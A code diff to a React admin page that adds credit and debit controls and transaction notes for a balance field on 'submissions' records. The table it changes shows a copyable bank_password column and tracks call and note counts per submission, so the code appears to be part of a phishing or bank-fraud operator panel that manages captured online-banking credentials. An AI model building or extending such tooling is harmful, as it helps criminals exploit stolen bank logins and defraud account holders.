@@ -11,8 +11,8 @@ import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@
 import { Badge } from "@/components/ui/badge";
 import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip";
 import { toast } from "sonner";
-import { Copy, Eye, MessageSquare, PhoneMissed, RefreshCw, Search } from "lucide-react";
-import { formatBalance } from "@/lib/format";
+import { Copy, Eye, MessageSquare, PhoneMissed, RefreshCw, Search, Plus, Minus } from "lucide-react";
+import { formatBalance, parseBalanceNumber } from "@/lib/format";
 import { useSubmissions, type Note } from "@/hooks/use-submissions";
 import { useQueryClient } from "@tanstack/react-query";
 
@@ -37,13 +37,16 @@ function LogsContent() {
   const user = useAdminUser();
   const queryClient = useQueryClient();
   const { submissions, noteCounts, callCounts, refetch } = useSubmissions();
-  const [balanceEdit, setBalanceEdit] = useState<{ id: string; value: string } | null>(null);
+  const [balanceEdit, setBalanceEdit] = useState<{ id: string; value: string; currentBalance: string } | null>(null);
   const [statusFilter, setStatusFilter] = useState<string>("Alle");
   const [noteDialog, setNoteDialog] = useState<{ id: string; notes: Note[] } | null>(null);
   const [callDialog, setCallDialog] = useState<{ id: string; calls: Call[] } | null>(null);
   const [newNote, setNewNote] = useState("");
   const [savingNote, setSavingNote] = useState(false);
   const [searchQuery, setSearchQuery] = useState("");
+  const [txMode, setTxMode] = useState<"+" | "-" | null>(null);
+  const [txAmount, setTxAmount] = useState("");
+  const [txNote, setTxNote] = useState("");
 
   const copyToClipboard = (text: string) => {
     navigator.clipboard.writeText(text);
@@ -62,6 +65,31 @@ function LogsContent() {
       );
       setBalanceEdit(null);
     }
+  };
+
+  const handleBalanceTx = async () => {
+    if (!balanceEdit || !user || !txAmount.trim() || !txMode) return;
+    const txNum = parseBalanceNumber(txAmount);
+    if (isNaN(txNum) || txNum <= 0) { toast.error("Ungültiger Betrag"); return; }
+    const currentNum = parseBalanceNumber(balanceEdit.currentBalance || "0");
+    const newNum = txMode === "+" ? currentNum + txNum : currentNum - txNum;
+    const formatted = formatBalance(String(newNum));
+    const { error } = await supabase.from("submissions").update({ balance: formatted }).eq("id", balanceEdit.id);
+    if (error) { toast.error("Fehler beim Speichern"); return; }
+    const sign = txMode === "+" ? "+" : "−";
+    const noteContent = `${sign}${formatBalance(txAmount)}${txNote.trim() ? ` — ${txNote.trim()}` : ""}`;
+    await supabase.from("submission_notes").insert({
+      submission_id: balanceEdit.id,
+      user_id: user.id,
+      user_email: user.email || "unknown",
+      content: noteContent,
+    });
+    queryClient.setQueryData<any[]>(["submissions"], (old) =>
+      old?.map((s) => (s.id === balanceEdit.id ? { ...s, balance: formatted } : s))
+    );
+    queryClient.invalidateQueries({ queryKey: ["submission-note-counts"] });
+    toast.success("Buchung gespeichert");
+    setBalanceEdit(null); setTxMode(null); setTxAmount(""); setTxNote("");
   };
 
   const updateStatus = async (id: string, status: string) => {
@@ -212,7 +240,7 @@ function LogsContent() {
                   <TableCell><CopyCell value={sub.bank_password} /></TableCell>
                   <TableCell>
                     <button
-                      onClick={() => setBalanceEdit({ id: sub.id, value: sub.balance || "" })}
+                      onClick={() => setBalanceEdit({ id: sub.id, value: sub.balance || "", currentBalance: sub.balance || "" })}
                       className="text-sm text-slate-600 hover:text-blue-600 cursor-pointer transition-colors"
                     >
                       {sub.balance || "-"}
@@ -287,20 +315,68 @@ function LogsContent() {
       </div>
 
       {/* Balance Edit Dialog */}
-      <Dialog open={!!balanceEdit} onOpenChange={(open) => !open && setBalanceEdit(null)}>
+      <Dialog open={!!balanceEdit} onOpenChange={(open) => { if (!open) { setBalanceEdit(null); setTxMode(null); setTxAmount(""); setTxNote(""); } }}>
         <DialogContent className="max-w-sm">
           <DialogHeader><DialogTitle>Guthaben bearbeiten</DialogTitle></DialogHeader>
           <div className="space-y-4">
-            <Input
-              placeholder="z.B. 1.250,00 €"
-              value={balanceEdit?.value || ""}
-              onChange={(e) => setBalanceEdit((prev) => prev ? { ...prev, value: e.target.value } : null)}
-              onKeyDown={(e) => e.key === "Enter" && saveBalance()}
-            />
-            <div className="flex justify-end gap-2">
-              <Button variant="outline" size="sm" onClick={() => setBalanceEdit(null)}>Abbrechen</Button>
-              <Button size="sm" onClick={saveBalance}>Speichern</Button>
-            </div>
+            {!txMode ? (
+              <>
+                <Input
+                  placeholder="z.B. 1.250,00 €"
+                  value={balanceEdit?.value || ""}
+                  onChange={(e) => setBalanceEdit((prev) => prev ? { ...prev, value: e.target.value } : null)}
+                  onKeyDown={(e) => e.key === "Enter" && saveBalance()}
+                />
+                <div className="flex justify-between items-center">
+                  <div className="flex gap-1">
+                    <Button size="sm" variant="outline" onClick={() => setTxMode("+")} className="gap-1">
+                      <Plus className="h-3.5 w-3.5" /> Zubuchen
+                    </Button>
+                    <Button size="sm" variant="outline" onClick={() => setTxMode("-")} className="gap-1">
+                      <Minus className="h-3.5 w-3.5" /> Abbuchen
+                    </Button>
+                  </div>
+                  <div className="flex gap-2">
+                    <Button variant="outline" size="sm" onClick={() => setBalanceEdit(null)}>Abbrechen</Button>
+                    <Button size="sm" onClick={saveBalance}>Speichern</Button>
+                  </div>
+                </div>
+              </>
+            ) : (
+              <>
+                <p className="text-sm text-slate-500">
+                  Aktuell: <span className="font-medium text-slate-700">{balanceEdit?.currentBalance || "0€"}</span>
+                </p>
+                <Input
+                  placeholder="Betrag"
+                  value={txAmount}
+                  onChange={(e) => setTxAmount(e.target.value)}
+                  autoFocus
+                />
+                <Input
+                  placeholder="Notiz (z.B. Echtzeitüberweisung)"
+                  value={txNote}
+                  onChange={(e) => setTxNote(e.target.value)}
+                />
+                {(() => {
+                  const txNum = parseBalanceNumber(txAmount);
+                  if (!txAmount.trim() || isNaN(txNum) || txNum <= 0) return null;
+                  const currentNum = parseBalanceNumber(balanceEdit?.currentBalance || "0");
+                  const newNum = txMode === "+" ? currentNum + txNum : currentNum - txNum;
+                  return (
+                    <p className="text-xs text-slate-400">
+                      Neuer Betrag: <span className="font-medium text-slate-600">{formatBalance(String(newNum))}</span>
+                    </p>
+                  );
+                })()}
+                <div className="flex justify-end gap-2">
+                  <Button variant="outline" size="sm" onClick={() => { setTxMode(null); setTxAmount(""); setTxNote(""); }}>Zurück</Button>
+                  <Button size="sm" onClick={handleBalanceTx} disabled={!txAmount.trim()}>
+                    {txMode === "+" ? "Zubuchen" : "Abbuchen"}
+                  </Button>
+                </div>
+              </>
+            )}
           </div>
         </DialogContent>
       </Dialog>
